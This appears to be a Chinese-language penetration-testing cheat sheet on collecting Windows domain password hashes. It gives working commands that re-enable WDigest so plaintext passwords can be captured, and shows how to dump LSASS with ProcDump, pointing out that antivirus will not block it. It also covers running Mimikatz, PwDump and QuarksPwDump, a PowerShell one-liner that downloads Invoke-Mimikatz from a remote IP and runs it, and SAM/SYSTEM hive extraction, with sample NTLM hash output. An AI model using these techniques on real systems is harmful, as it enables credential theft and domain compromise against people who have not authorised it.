# 域内hash收集

## KB2871997补丁绕过

微软为了防止用户的明文密码在内存中泄露，发布了KB2871997补丁，关闭了Wdigest功能。Windows Server2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows Server2012以下版本，如果安装了KB2871997补丁，攻击者同样无法获取明文密码。

在命令行环境开启或关闭Wdigest Auth，有如下两种方法：

使用 red add命令

```java
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f           // 开启Wdigest Auth
 
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f           // 关闭Wdigest Auth
```

**攻击方法：**
需要将UseLogonCredential的值设为1，然后注销当前用户，用户再次登录后使用mimikatz即可导出明文口令。

```java
Nishang中的Invoke-MimikatzWDigestDowngrade脚本集成了这个功能，地址如下：

https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1
```

使用：

```java
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

注销重新登录

win10成功，win11无法成功

## ****PwDump7工具****

下载地址：[https://www.openwall.com/passwords/windows-pwdump](https://www.openwall.com/passwords/windows-pwdump)

使用：

```java
PS C:\Users\Administrator\Downloads\pwdump8-8.2\pwdump8> .\pwdump8.exe

PwDump v8.2 - dumps windows password hashes - by Fulvio Zanetti & Andrea Petralia @ http://www.blackMath.it

Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:2D0DC68E26F39C60FB09E34B1BA80AAF
Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
DefaultAccount:503:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
WDAGUtilityAccount:504:AAD3B435B51404EEAAD3B435B51404EE:760F77F3D47554F14E6BD277B9FC522B
```

## Mimikatz工具

下载地址：https://github.com/gentilkiwi/mimikatz

使用:

```java
privilege::debug      // 提升至debug权限
sekurlsa::logonpasswords       // 抓取密码
```

## Procdump工具

Procdump是微软官方发布的工具，所以杀软不会拦截，其可以用来将目标lsass文件导出

可以用来跟Mimikatz做配合

下载地址：[https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump](https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump)

使用：

上传导出其lsass.exe

```java
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

将在目标机器上导出的lsass.dmp下载到本地后，执行mimikatz导出lsass.dmp里面的密码和hash：

```java
sekurlsa::minidump .\lsass.dmp       // 将导出的lsass.dmp载入到mimikatz中
sekurlsa::logonpasswords full                 // 获取密码
```

## QuarksPwDump工具

Quarks PwDump 是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。目前支持Windows XP/2003/Vista/7/8版本，相当稳定。

需要管理员权限

使用：

```java
QuarksPwDump.exe --dump-hash-local        // 导出本地hash值
QuarksPwDump.exe -dhl
```

```java
QuarksPwDump.exe -dhdc         // 导出内存中的域控哈希值
QuarksPwDump.exe --dump-hash-domain-cached
```

## Powershell脚本

使用powershell脚本加载mimikatz模块获取密码，该脚本位于powersploit后渗透框架中

下载地址：[https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

通过在目标机上远程下载执行该powershell脚本即可获取密码，需要管理员权限。

```java
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/powersploit/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
```

```java
powershell -exec bypass -c "& {Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -DumpCreds}"
```

## **通过SAM和System文件抓取密码和Hash**

```java
//目标机器执行
reg save hklm\sam sam.hive
reg save hklm\system system.hive
//本地mimikatz执行
lsadump::sam /sam:sam.hive /system:system.hive
```

**也可以直接使用mimikatz读取本地SAM文件，获得密码Hash：**

```java
privilege::debug
token::elevate
lsadump::sam
```